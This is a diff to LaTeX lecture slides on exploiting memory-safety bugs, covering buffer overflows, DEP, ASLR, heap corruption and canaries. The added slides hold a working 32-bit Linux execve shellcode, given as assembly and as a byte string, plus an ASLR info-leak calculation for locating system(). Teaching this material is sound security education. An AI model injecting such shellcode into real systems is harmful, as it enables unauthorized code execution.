@@ -35,9 +35,9 @@
             \dots
 
             \begin{description}
-                \item<1->[of them:] They did a great job.
-                \item<2->[of you:] You will see familiar material.
-                \item<3->[of us:] We are lazy.
+                \item[of them:] They did a great job.
+                \item[of you:] You will see familiar material.
+                \item[of us:] We are lazy.
             \end{description}
 
             Check them out at \url{http://rpis.ec/} and
@@ -160,7 +160,7 @@
 
             \begin{itemize}
                 \item arguments on stack (reverse order)\\
-                    aligned to \SI{16}{\byte} boundary
+                    stack aligned to \SI{16}{\byte} boundary
                 \item return via register (\texttt{EAX} / \texttt{ST0})
                 \item return address on stack\\
                     (old instruction pointer \texttt{IP})
@@ -267,6 +267,11 @@
     \end{itemize}
 \end{frame}
 
+\begin{frame}{\texttt{printf} Oriented Programming}
+    Brainfuck to \texttt{printf} format string compiler:\\
+    \url{http://github.com/HexHive/printbf}.
+\end{frame}
+
 \section{Buffer Overflow}
 
 \begin{frame}[fragile]{Variants}
@@ -318,6 +323,63 @@
 
 \section{Shell Code}
 
+\begin{frame}{Idea}
+    \begin{itemize}
+        \item supply executable binary code via buffer
+        \medskip
+        \item rewrite return address to point into buffer
+        \medskip
+        \item binary code opens a shell upon execution
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Example}
+    \begin{columns}
+        \begin{column}{0.55\textwidth}
+            \begin{nasmcode*}{autogobble,xleftmargin=1em}
+                xor     eax, eax    ;Clearing eax register
+                push    eax         ;Pushing NULL bytes
+                push    0x68732f2f  ;Pushing //sh
+                push    0x6e69622f  ;Pushing /bin
+                mov     ebx, esp    ;ebx now has address of /bin//sh
+                push    eax         ;Pushing NULL byte
+                mov     edx, esp    ;edx now has address of NULL byte
+                push    ebx         ;Pushing address of /bin//sh
+                mov     ecx, esp    ;ecx now has address of address
+                                    ;of /bin//sh byte
+                mov     al, 11      ;syscall number of execve is 11
+                int     0x80        ;Make the system call
+            \end{nasmcode*}
+        \end{column}
+        \begin{column}{0.45\textwidth}
+            \begin{pre*}{autogobble}
+                > nasm -f elf shellcode.asm
+                > objdump -d -M intel shellcode.o
+                00000000 <.text>:
+                   0:  31 c0                  xor    eax,eax
+                   2:  50                     push   eax
+                   3:  68 2f 2f 73 68         push   0x68732f2f
+                   8:  68 2f 62 69 6e         push   0x6e69622f
+                   d:  89 e3                  mov    ebx,esp
+                   f:  50                     push   eax
+                  10:  89 e2                  mov    edx,esp
+                  12:  53                     push   ebx
+                  13:  89 e1                  mov    ecx,esp
+                  15:  b0 0b                  mov    al,0xb
+                  17:  cd 80                  int    0x80
+            \end{pre*}
+        \end{column}
+    \end{columns}
+    \bigskip
+
+    Result:
+    \begin{pre*}{autogobble}
+        \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+    \end{pre*}
+
+    \sidenote{- \url{https://dhavalkapil.com/blogs/Shellcode-Injection/}}
+\end{frame}
+
 \begin{frame}{Bend Return Address to jump into Buffer}
     \begin{center}
         \huge Demonstration
@@ -330,8 +392,12 @@
     \begin{columns}
         \begin{column}{0.5\textwidth}
             \begin{center}
-                \includegraphics[width=0.9\textwidth]{dep_windows}
+                \includegraphics[width=1.1\textwidth]{dep_windows}
             \end{center}
+            \medskip
+
+            Have a look at \texttt{VMMap.exe} from Sysinternals Suite --- if
+            you are a Windows guy.
         \end{column}
         \begin{column}{0.5\textwidth}
             \begin{itemize}
@@ -383,6 +449,17 @@
 
 \section{Address Space Layout Randomization (ASLR)}
 
+\begin{frame}{Idea}
+    Randomize the location of (some) segments every time the program is run.
+    \medskip
+
+    Program must be compiled with \texttt{-pie -fPIE} (Position Independent
+    Code).
+    \medskip
+
+    Only really useful in combination with DEP.
+\end{frame}
+
 \begin{frame}[fragile]{\texttt{/proc/self/maps}}
     \begin{pre*}{autogobble}
         ~> cat /proc/self/maps
@@ -426,6 +503,31 @@
     some lines have been omitted
 \end{frame}
 
+\begin{frame}{Breaking ASLR}
+    \begin{itemize}
+        \item ELF image starts at \texttt{0x00400000} if PIE is not specified
+        \medskip
+        \pause
+        \item \textbf{Info leak:} if we manage to get pointer from the program
+            we can calculate the ASLR offset.\\
+            Remember the first example with \texttt{printf}?!
+        \medskip
+    \item \textbf{Brute Force:} Guessing may be a viable option on
+        \SI{32}{\bit}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Info Leak}
+    Lets say you have leaked a pointer to \texttt{printf}, \texttt{printf} is
+    at  \texttt{0xb7e72280}.
+    \bigskip
+    Look how far away \texttt{system} is from \texttt{printf}, it's
+    \texttt{0xD0F0} bytes.
+    \bigskip
+    We now know that \texttt{system} is at:
+    \[ \mathtt{0xb7e72280} - \mathtt{0xD0F0} = \mathtt{0xb7e65190} \]
+\end{frame}
+
 \section{Heap Corruption}
 
 \begin{frame}{Heap vs. Stack}
@@ -467,12 +569,21 @@
         \pause
         \item Structs commonly contain function pointers which can be
             overwritten
+        \bigskip
+        \pause
+        \item \textbf{Use After Free:} pointer gets still used somewhere after
+            free, pointer target is now attack surface, extremely common
+            complex programs (browsers)
+        \medskip
+        \item \textbf{Heap Spraying:} fill heap with exploitable code, viable
+            on \SI{32}{\bit}, not so on \SI{64}{\bit} (\textasciitilde
+            \SI{18446744}{\tera\byte})
     \end{itemize}
 \end{frame}
 
 \section{Stack Cookies (Canary)}
 
-\section{Code Pointer Integrity}
+\section{Control Flow Integrity}
 
 \section{A Word about x86\_64 and ARM}
 
